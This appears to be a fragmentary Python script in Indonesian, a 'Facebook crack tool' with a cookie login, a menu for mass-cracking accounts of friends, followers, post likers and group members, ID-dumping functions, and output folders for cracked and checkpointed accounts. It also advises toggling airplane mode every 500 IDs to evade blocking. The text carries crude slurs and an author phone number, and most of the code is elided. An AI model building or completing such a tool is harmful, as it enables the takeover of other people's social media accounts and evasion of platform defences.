# Decoded By Rayan-XD
# Source Code : KONTOL
# Wa Author : 085852768706
# Ga Usah Di Recode Monyet
...
def banner():
	clear()
	wel='# WELCOME TO FACEBOOK CRACK TOOL RAYANXD'
	cik2=mark(wel ,style='cyan')
	sol().print(cik2)
	ban='''
•   AUTHOR  : Rayan-XD  WHATSAPP : 085852768706  •       
...
def login_lagi334():
	try:
		banner()
		___kontol___ = input('[|] MASUKAN COOKIES : ')
		...
		print('\n LOGIN SUKSES.....JALANKAN ULANG');time.sleep(1)
		exit()
	except Exception as e:
...
def menu(my_name,my_id):
	...
	sol().print(fx)
	print(x+'['+h+'•'+x+'] HALLO👋 : '+str(my_name))
	print(x+'['+h+'•'+x+'] ID KAMU🔥 : '+str(my_id))
	print(x+'['+h+'•'+x+'] IP ADDRESS KAMU💀: : '+str(sh['origin']))
	io = '''[bold cyan][01] CRACK PUBLIK TEMAN	     [09] CRACK DARI FILE
[02] CRACK MASSAL                                                      [03] CEK CHECKPOINT
[04] CRACK DARI FOLLOWERS                                     [05] CEK CRACK RESULTS
[06] CRACK LIKE POSTINGAN	                                  [07] CARA NGENTOD
[08] CRACK GRUP MEMBER                                         [00] LOGOUT[bold cyan]'''
...
# DUMP ID MASSAL
def dump_massal():
	mas='[01] CRACK MASSAL DARI FILES\n[02] CRACK MASSAL MANUAL'
	...
	if pilih in ['1','01']:
		...
		try:
			jum = int(input(x+'['+p+'f'+x+'] MASUKAN JUMLAH ID : '))
		except ValueError:
...
def dump_likes():
	...
	win2 = mark(win, style='green')
	sol().print(win2)
	pil = input(x+'['+p+'f'+x+'] MASUKAN ID POSTINGAN : ')
	try:
...
def dump_grup():
	...
	sol().print(au2)
	idgrup = input("[•] MASUKAN ID/USERNAME GRUP : ")
...
def passwrd():
	...
	krek = '[•] OK RESULTS SAVED IN : INTERNAL MEMORY/RAYAN-DATA/OK/%s\n[•] CP RESULTS SAVED IN : INTERNAL MEMORY/RAYAN-DATA/CP/%s\nNYALAKAN MODE PESAWAT SETIAP 500 ID'%(okc,cpc)
